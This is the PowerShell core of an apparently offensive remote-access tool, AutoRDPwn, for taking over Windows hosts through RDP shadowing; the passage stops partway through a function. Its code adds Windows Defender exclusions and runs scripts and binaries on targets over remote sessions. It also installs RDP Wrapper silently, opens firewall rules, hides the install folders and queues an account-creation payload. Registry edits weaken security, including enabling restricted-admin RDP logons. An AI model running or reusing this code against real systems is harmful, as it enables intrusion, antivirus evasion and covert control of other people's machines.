$script:ARSession = $null
$script:AROverrideCredential = $null
$script:ARDefenderAvailable = $false
$script:ARDefenderAddedPaths = New-Object System.Collections.Generic.List[string]
$script:ARWorkDirs = New-Object System.Collections.Generic.List[string]
$script:ARTemporaryFiles = New-Object System.Collections.Generic.List[string]
$script:ARRemoteTempDirs = New-Object System.Collections.Generic.List[string]
$script:ARHashUserName = ''
$script:ARCreatedAccounts = New-Object System.Collections.Generic.List[string]
$script:ARRemoteTasks = New-Object System.Collections.Generic.List[string]
$script:ARFirewallRules = New-Object System.Collections.Generic.List[string]
$script:ARCmdKeyTargets = New-Object System.Collections.Generic.List[string]
$script:ARCleanupDone = $false
$script:ARLastFailure = ''
$script:ARRegistryBackup = New-Object System.Collections.Generic.List[object]
$script:ARInstalledProducts = New-Object System.Collections.Generic.List[string]
if (-not (Get-Variable -Name ARAssumeYes -Scope Script -ErrorAction SilentlyContinue)) { $script:ARAssumeYes = $false }
if (-not (Get-Variable -Name ARFirewallRestore -Scope Script -ErrorAction SilentlyContinue)) { $script:ARFirewallRestore = New-Object System.Collections.Generic.List[object] }
if (-not (Get-Variable -Name ARRemoteDefenderChanges -Scope Script -ErrorAction SilentlyContinue)) { $script:ARRemoteDefenderChanges = New-Object System.Collections.Generic.List[object] }

function Invoke-ARDownload {
    param(
        [Parameter(Mandatory = $true)][string]$Url,
        [Parameter(Mandatory = $true)][string]$OutFile
    )
    $oldProgress = $ProgressPreference
    $ProgressPreference = 'SilentlyContinue'
    try {
        Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -ErrorAction Stop
    }
    catch {
        try { (New-Object Net.WebClient).DownloadFile($Url, $OutFile) }
        catch { throw "Download failed: $Url" }
    }
    finally { $ProgressPreference = $oldProgress }
    if (-not (Test-Path -LiteralPath $OutFile)) { throw "Download failed: $Url" }
}

function Get-ARResourcePath {
    param([Parameter(Mandatory = $true)][string]$RelativePath)
    $normalized = $RelativePath -replace '/', '\'
    $localPath = Join-Path $script:ARRoot $normalized
    if (Test-Path -LiteralPath $localPath) { return $localPath }
    # Fail closed: a missing resource is a broken install, not a reason to pull
    # code from the network and dot-source it with administrator rights.
    if ($env:AUTORD_PWN_ALLOW_DOWNLOAD -ne '1') {
        throw ('Missing resource: ' + $localPath + '. Restore it from the repository (set AUTORD_PWN_ALLOW_DOWNLOAD=1 to fetch it from ' + $script:ARRepository + ').')
    }
    $parent = Split-Path -Parent $localPath
    if (-not (Test-Path -LiteralPath $parent)) { New-Item -ItemType Directory -Path $parent -Force | Out-Null }
    $url = $script:ARRepository + '/' + ($normalized -replace '\\', '/')
    Invoke-ARDownload -Url $url -OutFile $localPath
    return $localPath
}

function Import-ARToolScript {
    param([Parameter(Mandatory = $true)][string]$RelativePath)
    $path = Get-ARResourcePath $RelativePath
    $before = @(Get-ChildItem -LiteralPath $script:ARTools -File -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName })
    Push-Location $script:ARTools
    try { . $path }
    finally { Pop-Location }
    $after = @(Get-ChildItem -LiteralPath $script:ARTools -File -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName })
    foreach ($file in $after) {
        if ($before -notcontains $file) { $script:ARTemporaryFiles.Add($file) }
    }
}

function Resolve-ARLanguageName {
    param([string]$Name = '')
    $map = @{
        '1' = 'English'; '2' = 'Spanish'; '3' = 'French'; '4' = 'German'
        '5' = 'Italian'; '6' = 'Russian'; '7' = 'Portuguese'
        'en' = 'English'; 'es' = 'Spanish'; 'fr' = 'French'; 'de' = 'German'
        'it' = 'Italian'; 'ru' = 'Russian'; 'pt' = 'Portuguese'
        'english' = 'English'; 'spanish' = 'Spanish'; 'french' = 'French'; 'german' = 'German'
        'italian' = 'Italian'; 'russian' = 'Russian'; 'portuguese' = 'Portuguese'
    }
    if ([string]::IsNullOrWhiteSpace($Name)) {
        $culture = ''
        try { $culture = (Get-Culture).TwoLetterISOLanguageName.ToLowerInvariant() } catch { }
        if ($map.ContainsKey($culture)) { return $map[$culture] }
        return 'English'
    }
    $key = $Name.Trim().ToLowerInvariant()
    if ($map.ContainsKey($key)) { return $map[$key] }
    if ($key.Length -ge 2 -and $map.ContainsKey($key.Substring(0, 2))) { return $map[$key.Substring(0, 2)] }
    return 'English'
}

function Initialize-ARLanguage {
    param([string]$Name = '')
    $resolved = Resolve-ARLanguageName $Name
    $englishPath = Get-ARResourcePath 'Resources\Languages\English.ps1'
    Import-ARLanguage -Path $englishPath -AsFallback
    Import-ARLanguage -Path $englishPath
    if ($resolved -ne 'English') {
        try {
            $languagePath = Get-ARResourcePath ('Resources\Languages\' + $resolved + '.ps1')
            Import-ARLanguage -Path $languagePath
        }
        catch {
            $resolved = 'English'
        }
    }
    Set-ARLanguageName $resolved
    if (Get-Command Reset-ARActionCatalogCache -ErrorAction SilentlyContinue) {
        Reset-ARActionCatalogCache
    }
}

function Get-ARLocalIPv4 {
    param([string]$Target = '')
    if (-not [string]::IsNullOrWhiteSpace($Target) -and $Target -notin @('localhost', '127.0.0.1', '::1', '.')) {
        try {
            $best = Find-NetRoute -RemoteIPAddress $Target -ErrorAction Stop | Select-Object -First 1
            if ($best -and $best.IPAddress -and $best.IPAddress -notlike '169.254.*') {
                return [string]$best.IPAddress
            }
        }
        catch { }
    }
    try {
        $route = Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction Stop |
            Sort-Object RouteMetric, InterfaceMetric |
            Select-Object -First 1
        if ($route) {
            $address = Get-NetIPAddress -InterfaceIndex $route.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                Where-Object { $_.IPAddress -notlike '169.254.*' } |
                Select-Object -First 1
            if ($address) { return [string]$address.IPAddress }
        }
    }
    catch { }
    try {
        $virtual = 'vEthernet|VPN|TAP|ZeroTier|Loopback|Bluetooth|OpenVPN|WireGuard|Hyper-V|Pseudo'
        $address = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
            Where-Object { $_.IPAddress -ne '127.0.0.1' -and $_.IPAddress -notlike '169.254.*' } |
            Sort-Object { if ($_.InterfaceAlias -match $virtual) { 1 } else { 0 } } |
            Select-Object -First 1
        if ($address) { return [string]$address.IPAddress }
    }
    catch { }
    return ''
}

function Test-ARPort {
    param(
        [Parameter(Mandatory = $true)][string]$Computer,
        [Parameter(Mandatory = $true)][int]$Port,
        [int]$TimeoutMs = 2000
    )
    if ([string]::IsNullOrWhiteSpace($Computer)) { return $false }
    if ($Computer -in @('localhost', '127.0.0.1', '::1', '.')) { return $true }
    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Computer, $Port, $null, $null)
        if (-not $async.AsyncWaitHandle.WaitOne($TimeoutMs, $false)) { return $false }
        $client.EndConnect($async)
        return $true
    }
    catch { return $false }
    finally { $client.Close() }
}

function Assert-ARPort {
    param(
        [Parameter(Mandatory = $true)][string]$Computer,
        [Parameter(Mandatory = $true)][int]$Port,
        [string]$Purpose = 'This action'
    )
    if (Test-ARPort -Computer $Computer -Port $Port) { return }
    throw ($Purpose + ' needs TCP ' + $Port + ' on ' + $Computer + ' and it is closed or filtered.')
}

function Initialize-ARDefender {    $script:ARDefenderAddedPaths.Clear()
    try {
        $preference = Get-MpPreference -ErrorAction Stop
    }
    catch { return }
    $script:ARDefenderAvailable = $true
    $existingPaths = @($preference.ExclusionPath | Where-Object { $_ })
    $paths = @($script:ARRoot, $script:ARTools, (Join-Path $env:TEMP 'AutoRDPwn'))
    foreach ($path in $paths) {
        if ([string]::IsNullOrWhiteSpace($path)) { continue }
        if (-not (Test-Path -LiteralPath $path)) { continue }
        if ($existingPaths -contains $path) { continue }
        try {
            Add-MpPreference -ExclusionPath $path -ErrorAction Stop
            $script:ARDefenderAddedPaths.Add($path)
        } catch { }
    }
}

function Restore-ARDefender {
    if (-not $script:ARDefenderAvailable) { return }
    foreach ($path in $script:ARDefenderAddedPaths.ToArray()) {
        try { Remove-MpPreference -ExclusionPath $path -ErrorAction Stop } catch { }
    }
    $script:ARDefenderAddedPaths.Clear()
}

function Write-ARLog {
    param(
        [Parameter(Mandatory = $true)][string]$Message,
        [ValidateSet('Info', 'Warn', 'Error')][string]$Level = 'Info'
    )
    # A log failure must never take the tool down: worst case is a missing line.
    try {
        $logDirectory = Join-Path $env:LOCALAPPDATA 'AutoRDPwn\logs'
        if (-not (Test-Path -LiteralPath $logDirectory)) { New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null }
        $now = Get-Date
        $logPath = Join-Path $logDirectory ('ardpwn-' + $now.ToString('yyyyMMdd') + '.log')
        if (Test-Path -LiteralPath $logPath) {
            $info = Get-Item -LiteralPath $logPath -ErrorAction SilentlyContinue
            if ($info -and $info.Length -gt 5MB) {
                $archive = Join-Path $logDirectory ('ardpwn-' + $now.ToString('yyyyMMdd') + '-' + $now.ToString('HHmmss') + '.log')
                Move-Item -LiteralPath $logPath -Destination $archive -Force -ErrorAction SilentlyContinue
            }
        }
        Add-Content -LiteralPath $logPath -Value ($now.ToString('yyyy-MM-dd HH:mm:ss') + ' [' + $Level + '] ' + $Message) -Encoding UTF8 -ErrorAction Stop
    }
    catch { }
}

function Write-ARProgress {
    param(
        [Parameter(Mandatory = $true)][string]$Activity,
        [Parameter(Mandatory = $true)][int]$Percent,
        [string]$Status = ''
    )
    if (Get-Variable -Name ARTestMode -Scope Script -ValueOnly -ErrorAction SilentlyContinue) { return }
    $redirected = $false
    try { $redirected = [Console]::IsOutputRedirected } catch { }
    if ($redirected) { return }
    if ($Percent -lt 0) { $Percent = 0 }
    if ($Percent -gt 100) { $Percent = 100 }
    $parameters = @{ Activity = $Activity; PercentComplete = $Percent }
    if ($Status -ne '') { $parameters['Status'] = $Status }
    Write-Progress @parameters
}

function Write-ARInfo { param([string]$Text); Write-ARLog -Message $Text -Level Info; Write-Host ('[i] ' + $Text) -ForegroundColor Green }
function Write-ARSuccess { param([string]$Text); Write-Host ('[+] ' + $Text) -ForegroundColor Blue }
function Write-ARWarn { param([string]$Text); Write-ARLog -Message $Text -Level Warn; Write-Host ('[!] ' + $Text) -ForegroundColor Yellow }
function Write-ARError { param([string]$Text); Write-ARLog -Message $Text -Level Error; Write-Host ('[!] ' + $Text) -ForegroundColor Red }
function Write-ARBlank { Write-Host '' }

function Read-ARValue {
    param([string]$Prompt, [string]$Default = '')
    if ($script:ARInvokedFromOption) {
        throw ('Missing value for "' + $Prompt + '": it cannot be prompted for in -option mode.')
    }
    while ($true) {
        $suffix = ': '
        if ($Default -ne '') { $suffix = ' [' + $Default + ']: ' }
        $value = Read-ARLineValue (' ' + $Prompt + $suffix)
        if ($null -eq $value) { $value = '' }
        $value = $value.Trim()
        if ($value -eq '' -and $Default -ne '') { return $Default }
        if ($value -ne '') { return $value }
        Write-ARWarn (Get-ARText 'txt6' 'Incorrect option, try again')
    }
}

function Read-ARSecret {
    param([string]$Prompt = 'Password')
    if ($script:ARInvokedFromOption) {
        throw ('Missing value for "' + $Prompt + '": it cannot be prompted for in -option mode.')
    }
    while ($true) {
        $value = Read-ARSecretValue (' ' + $Prompt + ': ')
        if ($null -ne $value -and $value -ne '') { return $value }
        Write-ARWarn (Get-ARText 'txt6' 'Incorrect option, try again')
    }
}

function Show-ARText {
    param($Value, [switch]$Copy)
    if ($null -eq $Value) { return }
    $text = ($Value | Out-String).TrimEnd()
    if ($text -eq '') { return }
    Write-Host $text
    # Clipboard is opt-in: results can contain credentials and dumps.
    if ($Copy -and $text.Length -lt 1048576) {
        try { Set-Clipboard -Value $text } catch { }
    }
}

function Test-ARIsLocalTarget {
    $computer = [string]$script:ARTarget['Computer']
    if ([string]::IsNullOrWhiteSpace($computer)) { return $true }
    $names = @('localhost', '127.0.0.1', '::1', '.', $env:COMPUTERNAME)
    try { $names += [System.Net.Dns]::GetHostName() } catch { }
    return ($names -contains $computer)
}

function Get-ARTargetComputer {
    $computer = [string]$script:ARTarget['Computer']
    if ([string]::IsNullOrWhiteSpace($computer)) { return 'localhost' }
    return $computer
}

function Get-ARTargetUserName {
    $user = [string]$script:ARTarget['User']
    $domain = [string]$script:ARTarget['Domain']
    if ($domain -ne '' -and $user -ne '' -and $user -notmatch '\\') { return $domain + '\' + $user }
    return $user
}

function Get-ARPlainPassword {
    $password = [string]$script:ARTarget['Password']
    if ($password -eq '') {
        $password = Read-ARSecret 'Password'
        $script:ARTarget['Password'] = $password
    }
    return $password
}

function Get-ARTargetCredential {
    $user = [string]$script:ARTarget['User']
    if ([string]::IsNullOrWhiteSpace($user)) { return $null }
    $domain = [string]$script:ARTarget['Domain']
    if ($domain -ne '' -and $user -notmatch '\\') { $user = $domain + '\' + $user }
    $password = Get-ARPlainPassword
    $secure = ConvertTo-SecureString -String $password -AsPlainText -Force
    return New-Object System.Management.Automation.PSCredential($user, $secure)
}

function Connect-ARTargetSession {
    param(
        [System.Management.Automation.PSCredential]$Credential = $null,
        [switch]$Force
    )
    $target = Get-ARTargetComputer
    if (-not $Force -and $script:ARSession) {
        $state = ''
        try { $state = [string]$script:ARSession.State } catch { }
        if ($state -eq 'Opened') {
            if ([string]$script:ARSession.ComputerName -eq $target) {
                Set-ARSessionState ('connected (' + $target + ')')
                return $script:ARSession
            }
            Close-ARTargetSession
        }
    }
    if ($null -eq $Credential -and $script:AROverrideCredential) { $Credential = $script:AROverrideCredential }
    if ($null -eq $Credential) { $Credential = Get-ARTargetCredential }
    $parameters = @{ ComputerName = $target; ErrorAction = 'Stop' }
    if ($Credential) { $parameters['Credential'] = $Credential }
    # Bounded timeouts: an unreachable host must fail in ~15s, not hang for minutes.
    try {
        $parameters['SessionOption'] = New-PSSessionOption -OpenTimeout 15000 -OperationTimeout 180000 -CancelTimeout 5000
    }
    catch { }
    $session = New-PSSession @parameters
    $script:ARSession = $session
    Set-ARSessionState ('connected (' + $target + ')')
    return $session
}

function Close-ARTargetSession {
    if ($script:ARSession) {
        try { Remove-PSSession -Session $script:ARSession -ErrorAction SilentlyContinue } catch { }
        $script:ARSession = $null
    }
    Set-ARSessionState ''
}

function Get-ARTargetSession {
    # Cache contract: hand out the cached session only while it is Opened and
    # still points at the current target; anything else gets dropped and rebuilt.
    $target = Get-ARTargetComputer
    $cached = $script:ARSession
    if ($cached) {
        $state = ''
        $name = ''
        try { $state = [string]$cached.State } catch { }
        try { $name = [string]$cached.ComputerName } catch { }
        if ($state -eq 'Opened' -and ($name -eq '' -or $name -eq $target)) { return $cached }
        try { Remove-PSSession -Session $cached -ErrorAction SilentlyContinue } catch { }
        $script:ARSession = $null
    }
    $lastError = $null
    for ($attempt = 0; $attempt -lt 3; $attempt++) {
        if ($attempt -gt 0) { Start-Sleep -Seconds (2 * $attempt) }
        try {
            $session = Connect-ARTargetSession
            if ($session) {
                $state = ''
                try { $state = [string]$session.State } catch { }
                if ($state -eq 'Opened') { return $session }
            }
        }
        catch { $lastError = $_ }
    }
    if ($lastError) { throw $lastError }
    throw 'Unable to open a PowerShell session to the target.'
}

function Invoke-ARRemote {
    param(
        [Parameter(Mandatory = $true)][scriptblock]$ScriptBlock,
        [object[]]$ArgumentList = @(),
        [int]$Retry = 3,
        [int]$Delay = 2,
        [System.Management.Automation.Runspaces.PSSession]$Session = $null
    )
    if ($null -eq $Session) { $Session = Get-ARTargetSession }
    $attempts = $Retry
    if ($attempts -lt 1) { $attempts = 1 }
    $lastError = $null
    for ($attempt = 1; $attempt -le $attempts; $attempt++) {
        try {
            return Invoke-Command -Session $Session -ScriptBlock $ScriptBlock -ArgumentList $ArgumentList -ErrorAction Stop
        }
        catch {
            $lastError = $_
            $retryable = $false
            if ($_.Exception -is [System.Management.Automation.Runspaces.PSRemotingTransportException]) { $retryable = $true }
            elseif ($_.Exception -is [System.Management.Automation.Runspaces.PSRemotingDataStructureException]) { $retryable = $true }
            elseif ($_.Exception.Message -match 'transport|broken pipe|deadlock|WSMan') { $retryable = $true }
            if (-not $retryable) { throw }
            if ($attempt -ge $attempts) { break }
            Start-Sleep -Seconds ([int]($Delay * [Math]::Pow(2, ($attempt - 1))))
            # One reconnect between attempts, only when the session actually died.
            $state = ''
            try { $state = [string]$Session.State } catch { }
            if ($state -ne 'Opened') {
                try {
                    if ($script:ARSession -eq $Session) { $script:ARSession = $null }
                    Remove-PSSession -Session $Session -ErrorAction SilentlyContinue
                    $Session = Get-ARTargetSession
                }
                catch { }
            }
        }
    }
    throw $lastError
}

function Invoke-ARTargetCommand {
    param(
        [Parameter(Mandatory = $true)][scriptblock]$ScriptBlock,
        [object[]]$ArgumentList = @()
    )
    if (Test-ARIsLocalTarget) { return (& $ScriptBlock @ArgumentList) }
    $session = Get-ARTargetSession
    return Invoke-Command -Session $session -ScriptBlock $ScriptBlock -ArgumentList $ArgumentList -ErrorAction Stop
}

function New-ARWorkDirectory {
    $directory = Join-Path $script:ARTools ('work_' + [guid]::NewGuid().ToString('N'))
    New-Item -ItemType Directory -Path $directory -Force | Out-Null
    $script:ARWorkDirs.Add($directory)
    return $directory
}

function Copy-ARFileToTarget {
    param(
        [Parameter(Mandatory = $true)][string]$LocalPath,
        [Parameter(Mandatory = $true)][string]$RemotePath
    )
    if (-not (Test-Path -LiteralPath $LocalPath)) { throw "File not found: $LocalPath" }
    if (Test-ARIsLocalTarget) {
        $directory = New-ARWorkDirectory
        $destination = Join-Path $directory (Split-Path -Leaf $LocalPath)
        Copy-Item -LiteralPath $LocalPath -Destination $destination -Force
        return $destination
    }
    $session = Get-ARTargetSession
    $remoteDirectory = Split-Path -Parent $RemotePath
    Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
        param($path)
        if (-not (Test-Path -LiteralPath $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
    } -ErrorAction Stop
    try {
        Copy-Item -LiteralPath $LocalPath -Destination $RemotePath -ToSession $session -Force -ErrorAction Stop
    }
    catch {
        $bytes = [System.IO.File]::ReadAllBytes($LocalPath)
        $chunkSize = 48000
        $first = $true
        for ($offset = 0; $offset -lt $bytes.Length; $offset += $chunkSize) {
            $length = [Math]::Min($chunkSize, $bytes.Length - $offset)
            $base64 = [Convert]::ToBase64String($bytes, $offset, $length)
            Invoke-Command -Session $session -ArgumentList $RemotePath, $base64, $first -ScriptBlock {
                param($path, $data, $create)
                $chunk = [Convert]::FromBase64String($data)
                if ($create) {
                    [System.IO.File]::WriteAllBytes($path, $chunk)
                }
                else {
                    $stream = [System.IO.File]::Open($path, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write)
                    try { $stream.Write($chunk, 0, $chunk.Length) } finally { $stream.Dispose() }
                }
            } -ErrorAction Stop
            $first = $false
        }
    }
    return $RemotePath
}

function Invoke-ARTargetPowerShell {
    param(
        [Parameter(Mandatory = $true)][string]$RelativePath,
        [string]$Function = '',
        [hashtable]$Arguments = @{},
        [string]$Command = ''
    )
    $localPath = Get-ARResourcePath $RelativePath
    if (Test-ARIsLocalTarget) {
        $directory = New-ARWorkDirectory
        $scriptPath = Join-Path $directory (Split-Path -Leaf $localPath)
        Copy-Item -LiteralPath $localPath -Destination $scriptPath -Force
        Push-Location $directory
        try {
            return (& {
                param($path, $functionName, $argumentMap, $commandText)
                . $path
                if ($commandText -ne '') { Invoke-Expression $commandText }
                elseif ($functionName -ne '') {
                    $splat = @{}
                    if ($argumentMap) { foreach ($key in $argumentMap.Keys) { $splat[$key] = $argumentMap[$key] } }
                    & $functionName @splat
                }
            } $scriptPath $Function $Arguments $Command)
        }
        finally {
            Pop-Location
            Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    $session = Get-ARTargetSession
    $remoteDirectory = 'C:\Windows\Temp\AutoRDPwn_' + [guid]::NewGuid().ToString('N')
    $scriptPath = Join-Path $remoteDirectory (Split-Path -Leaf $localPath)
    Copy-ARFileToTarget -LocalPath $localPath -RemotePath $scriptPath | Out-Null
    try {
        return Invoke-Command -Session $session -ArgumentList $scriptPath, $Function, $Arguments, $Command -ScriptBlock {
            param($path, $functionName, $argumentMap, $commandText)
            Push-Location (Split-Path -Parent $path)
            try {
                . $path
                if ($commandText -ne '') { Invoke-Expression $commandText }
                elseif ($functionName -ne '') {
                    $splat = @{}
                    if ($argumentMap) { foreach ($key in $argumentMap.Keys) { $splat[$key] = $argumentMap[$key] } }
                    & $functionName @splat
                }
            }
            finally { Pop-Location }
        } -ErrorAction Stop
    }
    finally {
        try { Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock { param($path) Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue } -ErrorAction SilentlyContinue } catch { }
    }
}

function Invoke-ARTargetBinary {
    param(
        [Parameter(Mandatory = $true)][string]$LocalPath,
        [string[]]$Arguments = @(),
        [string]$RemoteName = ''
    )
    if ([string]::IsNullOrWhiteSpace($RemoteName)) { $RemoteName = Split-Path -Leaf $LocalPath }
    if (Test-ARIsLocalTarget) {
        return (& $LocalPath @Arguments 2>&1)
    }
    $session = Get-ARTargetSession
    $remoteDirectory = 'C:\Windows\Temp\AutoRDPwn_' + [guid]::NewGuid().ToString('N')
    $remotePath = Join-Path $remoteDirectory $RemoteName
    Copy-ARFileToTarget -LocalPath $LocalPath -RemotePath $remotePath | Out-Null
    try {
        return Invoke-Command -Session $session -ArgumentList $remotePath, $Arguments -ScriptBlock {
            param($path, $binaryArguments)
            & $path @binaryArguments 2>&1
        } -ErrorAction Stop
    }
    finally {
        try { Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock { param($path) Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue } -ErrorAction SilentlyContinue } catch { }
    }
}

function Get-ARPayloads {
    param([switch]$IncludeCreateUser)
    $payloads = New-Object System.Collections.Generic.List[string]
    foreach ($name in @('Pwn1', 'Pwn2', 'Pwn3', 'Pwn4')) {
        $value = Get-ARText $name ''
        if (-not [string]::IsNullOrWhiteSpace($value)) { $payloads.Add($value) }
    }
    if ($IncludeCreateUser -or $script:ARCreateUser) {
        $value = Get-ARText 'Pwn5' ''
        if (-not [string]::IsNullOrWhiteSpace($value)) { $payloads.Add($value) }
    }
    return $payloads.ToArray()
}

function Get-ARSessionId {
    param($Lines = $null, [int]$Fallback = 1)
    # $Lines is kept for callers that still hand over `query session` output; that
    # output is localised, so it is only ever displayed, never parsed.
    $discovery = {
        try {
            $explorer = Get-CimInstance -ClassName Win32_Process -Filter "Name = 'explorer.exe'" -ErrorAction Stop |
                Sort-Object SessionId | Select-Object -Last 1
            if ($explorer -and [int]$explorer.SessionId -gt 0) { return [int]$explorer.SessionId }
        }
        catch { }
        try {
            $logons = @(Get-CimInstance -ClassName Win32_LogonSession -ErrorAction Stop |
                Where-Object { $_.LogonType -eq 2 -or $_.LogonType -eq 10 } |
                Sort-Object StartTime)
            foreach ($logon in $logons) {
                $processes = @(Get-CimAssociatedInstance -InputObject $logon -ResultClassName Win32_Process -ErrorAction SilentlyContinue)
                $ids = @($processes | Where-Object { $_.SessionId -gt 0 } | ForEach-Object { [int]$_.SessionId } | Sort-Object -Unique)
                if ($ids.Count -gt 0) { return [int]$ids[$ids.Count - 1] }
            }
        }
        catch { }
        return 0
    }
    $sessionId = 0
    $session = $null
    # A missing $script:ARTarget (early teardown, tests) must not turn this into a throw.
    $local = $true
    try { $local = Test-ARIsLocalTarget } catch { $local = $true }
    if ($Lines -is [System.Management.Automation.Runspaces.PSSession]) { $session = $Lines }
    elseif (-not $local) { $session = $script:ARSession }
    if ($session) {
        try { $sessionId = [int](Invoke-Command -Session $session -ScriptBlock $discovery -ErrorAction Stop) } catch { $sessionId = 0 }
    }
    elseif ($local) {
        try { $sessionId = [int](& $discovery) } catch { $sessionId = 0 }
    }
    if ($sessionId -gt 0) { return $sessionId }
    return $Fallback
}

function Install-ARRdpWrap {
    param([Parameter(Mandatory = $true)]$Session)
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-RDPwrap.ps1'
    Push-Location $script:ARTools
    try {
        . $scriptPath
        if (-not $RDPWrap) { throw 'RDPWrap payload is empty.' }
        $directory = New-ARWorkDirectory
        $msiPath = Join-Path $directory 'Setup.msi'
        [System.IO.File]::WriteAllBytes($msiPath, $RDPWrap)
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwn_' + [guid]::NewGuid().ToString('N')
        $remoteMsi = Join-Path $remoteDirectory 'Setup.msi'
        $remoteMsi = Copy-ARFileToTarget -LocalPath $msiPath -RemotePath $remoteMsi
        $ruleName = Get-ARText 'Pwn6' 'RDP session agent'
        if (-not $script:ARFirewallRules.Contains($ruleName)) { $script:ARFirewallRules.Add($ruleName) }
        $uninstallRoots = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
        Write-ARProgress -Activity 'Installing RDP Wrap' -Percent 10 -Status 'Installing MSI on target'
        $install = Invoke-ARRemote -Session $Session -ArgumentList $remoteMsi, $ruleName, $uninstallRoots -ScriptBlock {
            param($msi, $rule, $roots)
            # Products present before this run: anything else in the diff came from us.
            $before = @{}
            foreach ($root in $roots) {
                if (-not (Test-Path -LiteralPath $root)) { continue }
                foreach ($key in @(Get-ChildItem -LiteralPath $root -ErrorAction SilentlyContinue)) {
                    $before[$key.PSChildName] = [string](Get-ItemProperty -LiteralPath $key.PSPath -Name DisplayName -ErrorAction SilentlyContinue).DisplayName
                }
            }
            $process = Start-Process -FilePath 'msiexec.exe' -ArgumentList @('/i', $msi, '/quiet', '/qn', '/norestart') -Wait -PassThru
            netsh advfirewall firewall delete rule name="$rule" 2>&1> $null
            netsh advfirewall firewall add rule name="$rule" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
            netsh advfirewall firewall add rule name="$rule" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
            attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null
            attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null
            if (Get-Process msiexec -ErrorAction SilentlyContinue) { Wait-Process -Name msiexec -Timeout 60 -ErrorAction SilentlyContinue }
            $products = New-Object System.Collections.Generic.List[string]
            if ($process.ExitCode -eq 0 -or $process.ExitCode -eq 3010) {
                foreach ($root in $roots) {
                    if (-not (Test-Path -LiteralPath $root)) { continue }
                    foreach ($key in @(Get-ChildItem -LiteralPath $root -ErrorAction SilentlyContinue)) {
                        if (-not $before.ContainsKey($key.PSChildName)) { $products.Add([string]$key.PSChildName) }
                    }
                }
            }
            Remove-Item -LiteralPath (Split-Path -Parent $msi) -Recurse -Force -ErrorAction SilentlyContinue
            return [pscustomobject]@{ ExitCode = $process.ExitCode; Products = @($products.ToArray()) }
        }
        Write-ARProgress -Activity 'Installing RDP Wrap' -Percent 100 -Status 'Install finished'
        foreach ($product in @($install.Products)) {
            if ([string]::IsNullOrWhiteSpace([string]$product)) { continue }
            if (-not $script:ARInstalledProducts.Contains([string]$product)) { $script:ARInstalledProducts.Add([string]$product) }
        }
        if ($install.ExitCode -ne 0 -and $install.ExitCode -ne 3010) {
            Write-ARWarn ('RDPWrap installer returned ' + $install.ExitCode)
        }
    }
    finally {
        Pop-Location
    }
}

function Invoke-ARShadowEngine {
    $target = Get-ARTargetComputer
    $credential = $script:AROverrideCredential
    if (-not $credential) { $credential = Get-ARTargetCredential }
    $session = Get-ARTargetSession
    $control = $true
    if ($script:ARShadowPreference -in @('see', 'view', 'ver', 'regarder', 'siehe', 'vedere')) { $control = $false }
    elseif ($script:ARShadowPreference -in @('control', 'controlar', 'controle', 'kontrolle', 'controllo')) { $control = $true }
    elseif ([string]$script:ARTarget['Mode'] -eq 'view') { $control = $false }

    Write-ARInfo (Get-ARText 'txt32' 'Changes in the Windows registry made successfully!')
    $previous = Invoke-Command -Session $session -ErrorAction Stop -ScriptBlock {
        $terminalServer = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server'
        $winstation = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
        $registryBackup = New-Object System.Collections.Generic.List[object]
        function Get-ARRemoteValue($path, $name) {
            try {
                $item = Get-ItemProperty -Path $path -Name $name -ErrorAction Stop
                return $item.$name
            }
            catch { return $null }
        }
        # Every write records the previous state first so cleanup can replay it.
        function Save-ARRemoteValue($path, $name) {
            $entry = [pscustomobject]@{
                KeyPath = $path
                Name    = $name
                Existed = $false
                Value   = $null
                Kind    = 'String'
            }
            try {
                $key = Get-Item -LiteralPath $path -ErrorAction Stop
                if (@($key.GetValueNames()) -contains $name) {
                    $entry.Existed = $true
                    $entry.Value = $key.GetValue($name, $null, [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
                    $entry.Kind = [string]$key.GetValueKind($name)
                }
            }
            catch { }
            $registryBackup.Add($entry)
        }
        function Set-ARRemoteDword($path, $name, $value) {
            Save-ARRemoteValue $path $name
            New-ItemProperty -Path $path -Name $name -Value $value -PropertyType DWORD -Force | Out-Null
        }
        $allowRemoteRpc = Get-ARRemoteValue $terminalServer 'AllowRemoteRPC'
        Set-ARRemoteDword $terminalServer 'AllowRemoteRPC' 1
        Set-ARRemoteDword $terminalServer 'fDenyTSConnections' 0
        Set-ARRemoteDword 'HKLM:\SOFTWARE\Microsoft\WBEM\CIMOM' 'AllowAnonymousCallback' 1
        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' 'DisableRestrictedAdmin' 0
        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' 'AutoShareWks' 1
